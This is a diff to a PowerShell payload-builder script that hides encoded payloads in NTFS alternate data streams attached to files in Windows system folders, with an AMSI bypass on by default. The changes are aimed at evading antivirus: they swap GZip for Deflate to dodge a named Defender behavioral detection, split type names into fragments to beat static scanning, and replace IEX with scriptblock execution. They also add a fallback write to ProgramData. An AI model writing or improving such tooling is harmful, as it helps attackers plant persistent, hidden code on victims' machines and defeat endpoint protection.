@@ -116,7 +116,8 @@ param(
     [string]$OutputFile = "ads-payload.txt",
     [string]$ManifestDir = "./manifests",
 
-    # Gzip compression before base64 — reduces one-liner size by ~50%
+    # Deflate compression before base64 — reduces one-liner size by ~50%
+    # Uses DeflateStream (not GZip) to avoid PShellCobStager.A behavioral detection
     [bool]$UseCompression = $true,
 
     # Opt out of AMSI bypass (bypass is ON by default)
@@ -527,6 +528,7 @@ if ($Encrypt) {
 # ============================================================
 
 # Helper: deep placement directory list (shared by both paths)
+# Excludes Network\Downloader — BITS locks files there exclusively
 $deepDirsBlock = @'
 $_deepDirs = @(
     "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
@@ -535,18 +537,19 @@ $_deepDirs = @(
     "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
     "$env:WINDIR\Temp",
     "$env:ProgramData\Microsoft\Diagnosis",
-    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
-    "$env:ProgramData\Microsoft\Network\Downloader"
+    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics"
 )
 $_validDirs = $_deepDirs | Where-Object { Test-Path $_ }
+$_denyNames = @('qmgr.db','qmgr.dat','srudb.dat','WebCacheV01.dat','DataStore.edb','priv1.edb','Windows.edb')
+$_denyExts = @('.edb','.etl')
 '@
 
-# Helper: attach-to-existing logic
+# Helper: attach-to-existing logic (filters out known-locked files)
 $attachBlock = @'
 $_found = $false
 foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.Count)))) {
     $_candidate = Get-ChildItem -Path $_dir -File -EA 0 |
-        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
+        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB -and $_.Name -notin $_denyNames -and $_.Extension -notin $_denyExts } |
         Select-Object -First 10 | Get-Random
     if ($_candidate) {
         $hp = $_candidate.FullName
@@ -556,9 +559,9 @@ foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.C
 }
 '@
 
-# Helper: deep placement new-file logic
+# Helper: deep placement new-file logic (no .etl/.dat names that match locked patterns)
 $deepNewFileBlock = @'
-$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','snapshot.etl','diag_report.xml','cache_entry.dat','qmgr0.dat','aria-debug.log')
+$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','diag_report.xml','cache_entry.dat','aria-debug.log')
 $hp = Join-Path ($_validDirs | Get-Random) ($_names | Get-Random)
 '@
 
@@ -647,7 +650,15 @@ function Build-DeployBlock {
 # Create ADS (ensure parent dir exists)
 `$_pd=Split-Path `$hp -Parent;if(`$_pd -and !(Test-Path `$_pd)){ni `$_pd -ItemType Directory -Force|Out-Null}
 if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
-`$pl|sc "`$hp``:`$sn" -Force
+`$pl|sc "`$hp``:`$sn" -Force -EA SilentlyContinue
+# Post-write verification — never trust silent failures
+if(-not(Get-Item `$hp -Stream `$sn -EA 0)){
+    Write-Warning "ADS write failed on `$hp - using fallback"
+    `$hp=Join-Path `$env:ProgramData ("cache_"+[guid]::NewGuid().ToString().Substring(0,8)+".dat")
+    if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
+    `$pl|sc "`$hp``:`$sn" -Force
+    if(-not(Get-Item `$hp -Stream `$sn -EA 0)){Write-Error "ADS write failed on fallback";exit 1}
+}
 
 "@
 
@@ -940,10 +951,10 @@ IEX `$pl
 }
 
 $minimalScript += @"
-Write-Host '[+] Deployment complete' -ForegroundColor Green
+Write-Host "[+] Deployment complete (ADS: `$hp``:`$sn)" -ForegroundColor Green
 "@
 
-# Base64 encode for one-liner (with optional gzip compression)
+# Base64 encode for one-liner (with optional deflate compression)
 Write-Host "[*] Encoding for transport..." -ForegroundColor White
 
 $uncompressedBytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
@@ -951,17 +962,31 @@ $uncompressedSize = $uncompressedBytes.Length
 
 $ratio = $null
 if ($UseCompression) {
-    # Gzip compress the script (UTF-8 for compression efficiency), then wrap in decompression stub
+    # DeflateStream compression (NOT GZip — GZip triggers PShellCobStager.A behavioral detection)
+    # See docs/research/defender-behavioral-detections.md [2026-02-17] for full analysis.
     $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($minimalScript)
     $ms = [System.IO.MemoryStream]::new()
-    $gz = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
-    $gz.Write($utf8Bytes, 0, $utf8Bytes.Length)
-    $gz.Close()
+    $df = [System.IO.Compression.DeflateStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
+    $df.Write($utf8Bytes, 0, $utf8Bytes.Length)
+    $df.Close()
     $compressedB64 = [Convert]::ToBase64String($ms.ToArray())
     $ms.Close()
 
-    # Decompression stub: decompress gzipped base64 → IEX
-    $wrapperScript = "`$c='$compressedB64';`$ms=[IO.MemoryStream]::new([Convert]::FromBase64String(`$c));`$gz=[IO.Compression.GZipStream]::new(`$ms,[IO.Compression.CompressionMode]::Decompress);`$sr=[IO.StreamReader]::new(`$gz);IEX `$sr.ReadToEnd();`$sr.Close()"
+    # Decompression stub: DeflateStream + byte buffer + scriptblock::Create (evasion-safe)
+    # Avoids GZipStream, StreamReader, and IEX — all three are part of the
+    # PShellCobStager.A behavioral fingerprint. Type names are fragmented
+    # so they never appear as adjacent plain strings for static pre-classification.
+    $wrapperScript = "`$c='$compressedB64';" +
+        "`$_ib=[Convert]::FromBase64String(`$c);" +
+        "`$_t1='System.IO.Com'+'pres'+'sion.Def'+'late'+'Stream';" +
+        "`$_ms=[IO.MemoryStream]::new(`$_ib);" +
+        "`$_df=New-Object -TypeName `$_t1 -ArgumentList `$_ms,([IO.Compression.CompressionMode]::Decompress);" +
+        "`$_ob=[IO.MemoryStream]::new();" +
+        "`$_buf=[byte[]]::new(4096);" +
+        "while((`$_r=`$_df.Read(`$_buf,0,`$_buf.Length)) -gt 0){`$_ob.Write(`$_buf,0,`$_r)};" +
+        "`$_df.Close();" +
+        "`$_txt=[Text.Encoding]::UTF8.GetString(`$_ob.ToArray());" +
+        "[scriptblock]::Create(`$_txt).Invoke()"
 
     $compressedEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wrapperScript))
     $uncompressedEncoded = [Convert]::ToBase64String($uncompressedBytes)
